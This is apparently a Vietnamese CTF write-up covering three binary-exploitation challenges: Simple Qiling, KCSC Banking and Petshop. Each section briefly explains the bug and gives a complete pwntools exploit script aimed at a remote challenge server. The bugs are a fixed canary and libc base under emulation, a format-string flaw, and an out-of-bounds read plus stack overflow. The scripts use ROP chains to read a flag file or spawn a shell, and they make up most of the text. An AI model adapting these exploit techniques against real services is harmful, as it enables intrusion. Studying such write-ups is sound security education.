
# Simple Qiling 

Dựa vào link này để có thể có môi trường chạy binary : !link<https://docs.qiling.io/en/latest/install/>

Đòng thời mình dựa vào bài WU này để biết được một số thông tin quan trọng để có thể solve challenge , https://ptr-yudai.hatenablog.com/entry/2023/07/22/184044#qjail .

Mình đã compile một file binary tĩnh sau đó chạy nó để test thử , thì mình có thể thấy canary luôn là 0x6161616161616100 :

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/288af95b-657c-4017-bd4b-69aef5dd0377)

Sau đó mình cũng biết được rằng địa chỉ libc cũng sẽ luôn cố định : 

Đây là ảnh memory của chuiowng trình khi mà nó crash , chạy nó 1,2 lần thì thấy địa chỉ này không bao giờ thay đổi :

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/fbae9826-f1aa-42b1-b96d-d320160f277d)

exploit :

```python
#!/usr/bin/env python3
from pwn import *

libc = ELF('./libc-2.31.so',checksec=False)
context.binary = exe = ELF('./simpleqiling',checksec=False)

def GDB():
    gdb.attach(p,gdbscript = '''
    c
    ''')
    input()
# p = process(["python3", "qi.py", "simpleqiling"])
p = remote("103.163.24.78",10010)
exe.address  =  0x555555554000
libc.address =  0x7fffb7dd6000

RDI = libc.address + 0x0000000000023b6a
RSI = libc.address + 0x000000000002601f
RDX = libc.address + 0x0000000000142c92
ret = libc.address + 0x0000000000022679
xchg = libc.address + 0x00000000000f1b65
RAX = libc.address + 0x0000000000036174
syscall = libc.address + 0x00000000000630a9
RSP = libc.address + 0x000000000002f70a
payload = flat(
    b"a"*0x28,
    0x6161616161616100,
    0x00000555555558500,
    RDI,0x000005555555585a0,
    libc.sym['gets'],
    RDI,0x000005555555585a0,
    libc.sym['puts'],
    RSP,0x000005555555585a0 + 0x10 + 0x100,
)
# GDB()
p.sendline(payload)
payload = flat(
    b"./flag.txt",b"\x00"*6,
    b"a"*0x100,
    RDI,0x000005555555585a0,
    RSI,0,RDX,0,
    libc.sym['open'],
    xchg,
    RSI,0x00000555555558500,
    RDX,0x100,
    libc.sym['read'],
    RSI,0x00000555555558500,
    RDX,0x100,
    RDI,1,
    libc.sym['write']
)
sleep(1)
p.sendline(payload)
p.interactive()
```


# KCSC BANKING 

Chúng ta có thể dễ dàng thấy một bug format string trong hàm info 

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/a34e4cb8-3d91-4a5e-bbd1-6132016ffdec)

Exploit : 
  +) sử dụng formattring để leak địa chỉ 
  
  +) Ta có thẻ tháy ở hàm logging , ta có thể tháy chương trình cho ta nhập rất nhiều byte cho username và password , nếu như debug có thể thấy nếu nhập đủ nhiều ký tự cho thì username của ta sẽ vẫn còn sót lại ngay cạnh địa chỉ trả về của hàm info . 

  +) Vậy bây giờ ta chỉ cần sử dụng formatstring để có thể ghi đè địa chỉ trả về của hàm info thành lệnh ret , trong username lúc đăng nhập ta sẽ chỉnh sao cho ngay sau địa chỉ trả về của hàm info sẽ là lệnh add rsp bao nhiêu đó để có thể nhảy vô payload ta chuẩn bị ở password 

  +) Vậy ở password ta chỉ cần ROP để có shell là được 

```python
from pwn import*
libc = ELF("./libc.so.6",checksec = False)
context.binary = exe = ELF("./banking",checksec = False)
def GDB():
    gdb.attach(p,gdbscript='''
    c
    ''')
    input()
# /usr/lib/x86_64-linux-gnu/libc.so.6
# p = remote("0",10002)
p = remote("103.163.24.78",10002)
# p = process(exe.path)

def reg(username,password,fullname):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"username: ",username)
    p.sendlineafter(b"password: ",password)
    p.sendlineafter(b"name: ",fullname)

def login(username,password):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b"Username:",username)
    p.sendlineafter(b"Password:",password)

def info():
    p.sendlineafter(b'>',b"3")
input("Set the break point")
# GDB()
acc = b"DQP"
S2 = b"1"
payload = b"%p || "*5 + b"^%p^" + b" $ %p$" + b"|%p|"*3 + b"&&& %p&"
reg(acc,S2,payload)
login(acc,S2)
info()

p.recvuntil(b"^")
stack = int(p.recvuntil(b"^",drop=True),16)
log.info('[+] STACK : ' + hex(stack))
p.recvuntil(b"$ ")
exe.address = int(p.recvuntil(b"$",drop=True),16) -   0x17d6

p.recvuntil(b"&&& ")
libc.address = int(p.recvuntil(b"&",drop=True),16) -   0x55b32
log.info('[+] EXE LEAK : '+ hex(exe.address))
log.info('[+] LIBC LEAK : '+ hex(libc.address))

one = libc.address + 0xe35a9
RDI = libc.address + 0x00000000000240e5
RDX = libc.address + 0x0000000000026302
RSI = libc.address + 0x000000000002573e
# ########## change the stack #############
saverip = stack - 0x128 
one_stack = stack - 0x108
ret = exe.address + 0x000000000000101a
RSP58 = libc.address + 0x000000000009ac55 # add rsp, 0x58; ret;
payload = flat(
    b"A"*0x58,
    p64(saverip),
)
p.sendlineafter(b"> ",b'4')
p.sendlineafter(b"Please leave a feedback:",payload)
acc1 = flat(
    RSP58,b"A"*(0x30- 0x18) , p64(RSP58)
)

s3 = flat(
    RDI,next(libc.search(b"/bin/sh\x00")),
    # ret,
    libc.sym['system']
)
s3 = s3.ljust(0x58,b"B")
s3 += p64(saverip)
payload = flat(
    f"%{ret & 0xffff}c%31$hn"
)
reg(acc1,s3,payload)
login(acc1,s3)
info()
p.interactive()
```


#  PETSHOP


Ta có OOB ở trong hàm sell , ta có thể dùng nó để leak địa chỉ :

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/edaef9a6-1840-4cec-9d9e-dd57f7630d07)

Ta có bof cũng ở trong hàm sell : 

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/713f0fa3-8f40-4c85-bf20-2905174f21ff)

ta thấy chương trình check xem ở hàm scanf có trả về một 1 , tức là ta chỉ cần làm cho scanf scan fail là được , giá trị ở của n ở trên stack trước khi scan ko hề đươc khởi tạo ==> BOF :

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./petshop_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
def GDB():
    gdb.attach(p,gdbscript='''
    c
    ''')
    input()

# p = process(exe.path)
p = remote("103.163.24.78",10001)
def buy(index,name):
    p.sendlineafter(b"--> ",b"buy "+ f"dog {index}".encode())
    p.sendlineafter(b"What is your pet's name?",name)

def info(payload):
    p.sendlineafter(b"--> ",b"info "+ payload)

def sell(payload,size,reason):
    p.sendlineafter(b"--> ",b"sell "+ payload)
    p.sendlineafter(b"You    -->",f"{size}".encode())
    p.sendlineafter(b"You    -->",reason)
buy(-6,b"dog1")
buy(0,b"dog2")
buy(1,b"dog3")
info(b"mine")
p.recvuntil(b"1. ")
exe.address = int.from_bytes(p.recvline()[:-1],"little")  - 0x4008
log.info("[+]EXE LEAK :"+hex(exe.address))
RDI = exe.address + 0x0000000000001a13
LEAK = exe.address + 0x18B2
RET = RDI +1
p.sendlineafter(b"--> ",b"sell 0")
p.sendlineafter(b"You    -->",f"{1000}".encode())
sleep(1)
p.sendline(b"sell 1")
p.sendline(b"+")
payload = flat(
    b"A"*0x200,p64(exe.address + 0x4500),
    RDI,exe.address + 0x3f88,
    LEAK
)
# GDB()
p.sendline(payload)
p.recvuntil(b"That seems reasonable!\n")
libc.address = int.from_bytes(p.recv(6),"little") - 0x84420
log.info("[+]LIBC LEAK :"+hex(libc.address))


p.sendline(b"sell 2")
p.sendline(b"+")
payload = flat(
    b"A"*0x200,p64(exe.address + 0x4500),
    RDI,next(libc.search(b"/bin/sh\x00")),
    RET,
    libc.sym['system']
)
p.sendline(payload)



p.interactive()

```





